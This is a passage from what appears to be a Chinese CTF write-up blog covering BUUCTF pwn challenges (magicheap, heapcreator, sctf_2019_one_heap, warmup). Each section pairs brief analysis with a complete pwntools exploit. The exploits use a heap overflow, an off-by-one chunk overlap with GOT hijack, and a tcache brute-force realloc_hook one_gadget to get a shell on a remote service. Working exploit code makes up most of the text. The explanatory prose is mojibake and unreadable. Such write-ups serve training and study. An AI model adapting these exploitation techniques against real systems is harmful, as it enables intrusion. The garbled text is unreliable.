class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwnme2&#x27;</span>)<br>string = <span class="hljs-number">0x0804A060</span><br>gets = elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p32(gets) + p32(<span class="hljs-number">0x080485CB</span>) + p32(string)<br>p.recvuntil(<span class="hljs-string">&quot;input:&quot;</span>)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&quot;./flag&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="åä¸€ã€hitcontraining-magicheap"><a href="#åä¸€ã€hitcontraining-magicheap" class="headerlink" title="åä¸€ã€hitcontraining_magicheap"></a>åä¸€ã€hitcontraining_magicheap</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827153019146.png" alt="image-20210827153019146"></p><p>å¸¸è§„checksecï¼Œ64ä½ï¼Œæ ¹æ®é¢˜ç›®æ˜¯é“å †é¢˜ï¼Œå¼€äº†NXã€Canary</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827153850520.png" alt="image-20210827153850520"></p><p>è¿›å…¥IDAï¼Œå‘ç°ç»™äº†ä¸ªåé—¨å‡½æ•°ï¼Œå¥½ä¸œè¥¿</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827155315034.png" alt="image-20210827155315034"></p><p>è¿™è¾¹å¦‚æœmagic &gt;4869å°±å¯ä»¥æ‰§è¡Œåˆ°åé—¨å‡½æ•°</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827155753245.png" alt="image-20210827155753245"></p><p>æ¼æ´ç‚¹å¯ä»¥è¯´æ˜¯ååˆ†æ˜æ˜¾äº†ï¼Œè¿™è¾¹editå‡½æ•°é‡Œé¢è¾“å…¥çš„é•¿åº¦éƒ½æ²¡æœ‰æ£€æŸ¥çš„</p><p>æ€è·¯ï¼šé€šè¿‡å †æº¢å‡ºï¼Œè¦†ç›–åé¢å †å—ï¼ŒæŠŠå †å—ç”³è¯·åˆ°magicå‰é¢ï¼ŒæŠŠmagicçš„å€¼ä¿®æ”¹æˆå¤§äº4869</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827161445791.png" alt="image-20210827161445791"></p><p>æˆåŠŸgetshell</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./magicheap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29052</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size of Heap :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>shell = <span class="hljs-number">0x0000000000400C50</span><br>magic = <span class="hljs-number">0x00000000006020A0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x70</span>) + p64(magic-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x60</span>,p64(<span class="hljs-number">4870</span>))<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">4870</span>))<br><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4869&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="åäºŒã€hitcontraining-heapcreator"><a href="#åäºŒã€hitcontraining-heapcreator" class="headerlink" title="åäºŒã€hitcontraining_heapcreator"></a>åäºŒã€hitcontraining_heapcreator</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829092850758.png" alt="image-20210829092850758"></p><p>å¸¸è§„checksecï¼Œå¼€äº†NXã€Cannary</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829094339915.png" alt="image-20210829094339915"></p><p>è¿›å…¥IDAï¼Œé˜…è¯»å®Œä»£ç åï¼Œåœ¨editå‡½æ•°ä¸­ï¼Œå­˜åœ¨æ˜æ˜¾çš„æº¢å‡ºä¸€ä¸ªå­—èŠ‚çš„æ¼æ´ï¼ˆoffbyoneï¼‰</p><p>å› ä¸ºæœ‰offbyoneæ¼æ´åœ¨ï¼Œé‚£è‚¯å®šæ˜¯æœç€å»ä¿®æ”¹å †å¤´çš„å¤§å°å»çš„ï¼Œæœ€ç»ˆè¾¾æˆoverlap</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829104050093.png" alt="image-20210829104050093"></p><p>å…ˆç”³è¯·å‡ºè¿™äº›å †å—ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªæ˜¯è¦ç”³è¯·0x18çš„ï¼Œå› ä¸ºè¿™æ ·æ‰èƒ½è¦†ç›–åˆ°ä¸‹ä¸€ä¸ªå †å—çš„sizeä½ã€‚ç„¶åå› ä¸ºRELROå’ŒPIEçš„ç¼˜æ•…ï¼Œæˆ‘é€‰æ‹©åŠ«æŒgotè¡¨çš„æ–¹æ³•ï¼Œæ‰€ä»¥ç¬¬å››ä¸ªå †å—å†…å®¹å°±æ˜¯å†™ç€/bin/sh\x00çš„ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æŠŠ/bin/sh\x00å†™åˆ°ç¬¬0ä¸ªå †å—ä¸Š</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829104713815.png" alt="image-20210829104713815"></p><p>æ­¤æ—¶åªè¦å†æŠŠè¿™ä¸ªé‡Šæ”¾äº†ï¼Œç„¶åå†ç”³è¯·åŒæ ·å¤§å°çš„å †å—å›æ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ“æ§å…¶ä¸­æœ¬æ¥æ˜¯ç¬¬äºŒå †å—çš„å†…å®¹</p><p>ç„¶åæŠŠå¯ä»¥æ“æ§çš„å †ç»“æ„å†…å®¹ä¿®æ”¹ä¸ºfreeçš„gotè¡¨åœ°å€ï¼Œä»è€Œå¯ä»¥åˆ©ç”¨showå‡½æ•°æ‰“å°å‡ºlibcåœ°å€ã€‚æœ€åå†å†™å…¥syså³å¯getshell</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829110519523.png" alt="image-20210829110519523"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./heapcreator&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26372</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;c&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>) <br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x81&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0x8</span>) + p64(free_got))<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content : &quot;</span>)<br>free = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-built_in">hex</span>(free))<br>libc=LibcSearcher(<span class="hljs-string">&quot;free&quot;</span>,free)<br>sys=libc.dump(<span class="hljs-string">&quot;system&quot;</span>)+free-libc.dump(<span class="hljs-string">&quot;free&quot;</span>)<br>edit(<span class="hljs-number">2</span>,p64(sys))<br>free(<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="åä¸‰ã€sctf-2019-one-heap"><a href="#åä¸‰ã€sctf-2019-one-heap" class="headerlink" title="åä¸‰ã€sctf_2019_one_heap"></a>åä¸‰ã€sctf_2019_one_heap</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830160009616.png" alt="image-20210830160009616"></p><p>checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œä¿æŠ¤å…¨å¼€</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163315917.png" alt="image-20210830163315917"></p><p>è¿›å…¥IDAï¼Œå †çš„èœå•åªæœ‰ä¸¤ç§åŠŸèƒ½ï¼Œç”³è¯·å’Œé‡Šæ”¾</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163404930.png" alt="image-20210830163404930"></p><p>ç”³è¯·çš„å †å—ä¸èƒ½å¤§äº0x7fï¼Œå¹¶ä¸”ç”³è¯·å’Œé‡Šæ”¾éƒ½æœ‰æ¬¡æ•°é™åˆ¶ï¼ˆå…¶ä¸­èƒ½ç”³è¯·0xfæ¬¡ï¼Œé‡Šæ”¾4æ¬¡ï¼‰ã€‚è€Œä¸”ï¼Œå †å—æˆ‘ä»¬åªèƒ½è®¿é—®åˆ°å½“å‰ç”³è¯·å‡ºçš„å †å—</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163542538.png" alt="image-20210830163542538"></p><p>é‡Šæ”¾å †å—æ—¶ï¼ŒæŒ‡é’ˆæ²¡æœ‰ç½®0</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830185924091.png" alt="image-20210830185924091"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830200649131-1630325227529.png" alt="image-20210830200649131"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830201741615.png" alt="image-20210830201741615"></p><p>è¿ç»­é‡Šæ”¾ä¸¤æ¬¡å¤§å°ä¸º0x70çš„å †å—ï¼Œè¿›å…¥åˆ°tcache bin ä¸­ï¼Œç„¶åæ ¹æ®ä¸€ä¸ªå­—èŠ‚æœªçŸ¥è¿›è¡Œçˆ†ç ´ï¼Œä½¿å¾—å †å—åˆ†é…tcache_perthread_structï¼ˆå°±æ˜¯å¼€å¤´0x250çš„é‚£ä¸ªå †å—ï¼‰ä¸Š</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830203528418.png" alt="image-20210830203528418"></p><p>æŠŠæ•°å€¼æ”¹ä¸º7ï¼Œç„¶åå†æŠŠè¿™ä¸ªå †å—é‡Šæ”¾ï¼Œå°†ä¼šè¿›å…¥åˆ°unsorted binä¸­</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830210232915.png" alt="image-20210830210232915"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830210216419.png" alt="image-20210830210216419"></p><p>fdï¼Œbkå·²ç»æŒ‡å‘äº†libcä¸­æŸä¸ªåœ°å€äº†ï¼Œæ‰€ä»¥åé¢è¿˜æ˜¯çˆ†ç ´ä¸€ä¸ªå­—èŠ‚ï¼Œå»è®©stdoutåå‡ºlibcåœ°å€ã€‚ç„¶åå› ä¸ºtcacheç»“æ„è¢«æ”¹åŠ¨å¾ˆå¤§ï¼Œè¦å…ˆä¿®å¤ä¸€ä¸‹</p><p>åé¢å…¶å®å°±æ²¡æœ‰ä»€ä¹ˆäº†ï¼Œå°±æ˜¯ç”³è¯·å‡ºå †å—ï¼Œå› ä¸ºæˆ‘ä»¬æŠŠtcache_perthread_structé‡Šæ”¾äº†ï¼Œæ‰€ä»¥ç”³è¯·å‡ºçš„å †å—éƒ½åœ¨ä¸Šé¢ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å¡«å†™å‡ºç›®æ ‡åœ°å€ï¼Œç„¶åå°±ä¼šè¿›å…¥åˆ°tcache binä¸­ï¼Œæ¥ç€å†ç”³è¯·å°±èƒ½ä»»æ„åœ°å€å†™ã€‚è¿™è¾¹è¿˜è¦æ³¨æ„çš„å°±æ˜¯è¿˜è¦ç”¨reallocè°ƒæ•´ä¸€ä¸‹rsp</p><p>ç„¶åè¿™è¾¹è¯´ä¸‹ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯è¿æ°”é—®é¢˜ï¼Œçˆ†ç ´ä¸Šåƒæ¬¡éƒ½æ²¡æ‰“é€š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./sctf_2019_one_heap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,28247)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Input the size:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Input the content:&quot;</span>)<br>p.sendline(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">first,second</span>):</span><br>add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free()<br>free()<br>add(<span class="hljs-number">0x70</span>,p16((first &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x70</span>,p8(<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x07000000</span>))<br>free()<br>add(<span class="hljs-number">0x40</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span>)<br>add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p16((second &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x60</span>))<br>add(<span class="hljs-number">0x40</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.recv(<span class="hljs-number">8</span>)<br>leak_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;leak_addr==&gt;0x%x&quot;</span> %leak_addr)<br>libc_base = leak_addr - <span class="hljs-number">0x3ed8b0</span><br>ogg = libc_base + <span class="hljs-number">0x10a38c</span><br>realloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__realloc_hook&quot;</span>]<br>realloc = libc_base + libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]<br>log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br>add(<span class="hljs-number">0x10</span>,p64(<span class="hljs-number">0</span>) + p64(realloc_hook))<br>add(<span class="hljs-number">0x40</span>,p64(ogg) + p64(realloc + <span class="hljs-number">0x4</span>))<br>add(<span class="hljs-number">0x10</span>)<br><br><span class="hljs-keyword">try</span>:<br>p.sendline(<span class="hljs-string">&quot;id&quot;</span>)<br>p.recvline_contains(<span class="hljs-string">&quot;uid&quot;</span>, timeout=<span class="hljs-number">2</span>)<br>p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>p.interactive()<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">try</span>:<br>p.close()<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>n = <span class="hljs-number">0x1000</span><br><span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>log.success(<span class="hljs-string">&quot;counts: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0x1000</span> - n))<br><span class="hljs-keyword">try</span>:<br>pwn(<span class="hljs-number">0x60</span>,<span class="hljs-number">0x67</span>)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28247</span>)<br>n -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="åå››ã€warmup"><a href="#åå››ã€warmup" class="headerlink" title="åå››ã€warmup"></a>åå››ã€warmup</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104431370.png" alt="image-20210831104431370"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œåªå¼€äº†NX</p><p>è¿›å…¥IDAï¼Œå‘ç°å‡½æ•°å¾ˆå°‘ï¼Œè€Œä¸”éƒ½æ˜¯è°ƒç”¨ç³»ç»Ÿè°ƒç”¨å·æ‰§è¡Œå‡½æ•°çš„ã€‚æ‰€ä»¥è‚¯å®šæ˜¯è¦æ‰§è¡Œåˆ°0xBçš„execveå‡½æ•°æ¥getshell</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104803643.png" alt="image-20210831104803643"></p><p>é¦–å…ˆï¼Œè¦å…ˆåˆ¶é€ å‡º/bin/sh\x00æ‰è¡Œï¼Œæ‰€ä»¥å…ˆè·³è½¬åˆ°readä¸Šå»ï¼Œå¾€.bssæ®µä¸Šå†™/bin/sh\x00ã€‚ä»”ç»†çœ‹ï¼Œè¿™è¾¹ä¼ 